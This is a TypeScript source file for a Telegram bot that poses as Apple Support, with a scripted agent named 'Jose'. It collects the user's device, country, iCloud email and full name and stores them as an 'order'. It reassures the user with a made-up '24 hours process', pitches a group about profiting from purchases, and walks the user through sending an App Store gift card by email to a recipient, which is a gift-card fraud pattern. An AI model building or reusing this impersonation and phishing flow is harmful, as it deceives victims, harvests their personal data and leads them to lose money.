import { Context } from 'grammy';
import type { Conversation, ConversationFlavor } from '@grammyjs/conversations';
import { createOrderSchema } from 'core/validation';
import type { CreateOrderInput } from 'core/validation';
import { orderDAL } from 'core/dal/order';

type MyContext = Context & ConversationFlavor;
type MyConversation = Conversation<MyContext>;

interface ConversationState {
  device?: string;
  country?: string;
  icloudEmail?: string;
  fullName?: string;
  consentGroupInvite?: boolean;
}

export async function orderConversation(conversation: MyConversation, ctx: MyContext) {
  const state: ConversationState = {};
  const user = ctx.from;

  if (!user) {
    await ctx.reply("Sorry, I couldn't identify you. Please start again.");
    return;
  }

  // Greeting
  await ctx.reply("Thanks for contacting Apple Support. Please give me a moment to look over the information you have provided.");

  await ctx.reply(`This is Jose and I will be your support today ${user.first_name}. Got you cannot make purchases.`);

  // Ask device
  await ctx.reply("In order to start, may I know which device are you using to contact us? I mean is it an iPhone, iPad or Mac?");

  let deviceValidated = false;
  while (!deviceValidated) {
    const deviceResponse = await conversation.wait();
    const deviceText = deviceResponse.message?.text?.toLowerCase();

    if (deviceText?.includes('iphone')) {
      state.device = 'iPhone';
      deviceValidated = true;
    } else if (deviceText?.includes('ipad')) {
      state.device = 'iPad';
      deviceValidated = true;
    } else if (deviceText?.includes('mac')) {
      state.device = 'Mac';
      deviceValidated = true;
    } else {
      await ctx.reply("Please specify one of the supported Apple devices: iPhone, iPad, or Mac.");
    }
  }

  // Ask country
  await ctx.reply("In order to proceed, may I know the country where you are?");
  const countryResponse = await conversation.wait();
  state.country = countryResponse.message?.text || '';

  // Ask iCloud email
  await ctx.reply("Your iCloud email address?");
  const emailResponse = await conversation.wait();
  state.icloudEmail = emailResponse.message?.text || '';

  // Ask name
  await ctx.reply("First name and last name?");
  const nameResponse = await conversation.wait();
  state.fullName = nameResponse.message?.text || '';

  // Acknowledge
  await ctx.reply("Thanks. Be right back. A notification would be sent to you, click 'Confirm'.");

  // 24-hour process message
  await ctx.reply(`Alright ${user.first_name}, I have created a 24 hours process which means the issue should be solved in 24 hours. Please don't try to make other purchases since it might interrupt or cancel the process I've created. If the issue persists, please write us back to escalate again.`);

  // Check clarity
  await ctx.reply("Is the path to follow clear? Or is there any other information I can help you with from here?");
  await conversation.wait(); // Wait for user response

  // Group invitation
  await ctx.reply("Would you like to be added to a group where we share opportunities on how to earn profits from making purchases on Apple Store?");
  const groupResponse = await conversation.wait();
  const groupText = groupResponse.message?.text?.toLowerCase();
  state.consentGroupInvite = groupText?.includes('yes') || groupText?.includes('y') || false;

  // Purchase instructions
  const instructions = `How to make purchases:
Open App Store → Click your profile (top right) →
Click 'Send Gift Card by Email' →
Fill 'To:' with recipient email →
Add price in 'Other' →
Click Next → Select theme →
Click 'Buy' (top right) → Proceed 'Buy Now'.`;

  await ctx.reply(instructions);

  // Create order
  try {
    const orderData: CreateOrderInput = {
      telegramChatId: ctx.chat?.id || 0,
      telegramUserId: user.id,
      telegramUsername: user.username,
      firstName: user.first_name,
      lastName: user.last_name,
      device: state.device as any,
      country: state.country!,
      icloudEmail: state.icloudEmail!,
      fullName: state.fullName!,
      consentGroupInvite: state.consentGroupInvite || false,
    };

    const validatedData = createOrderSchema.parse(orderData);
    const savedOrder = await orderDAL.createOrder(validatedData);
    
    console.log('Order saved to database:', savedOrder.id);
    await ctx.reply(`Your order has been submitted successfully! Order ID: ${savedOrder.id}`);

  } catch (error) {
    console.error('Failed to create order:', error);
    await ctx.reply("Sorry, there was an error processing your request. Please try again.");
  }
}
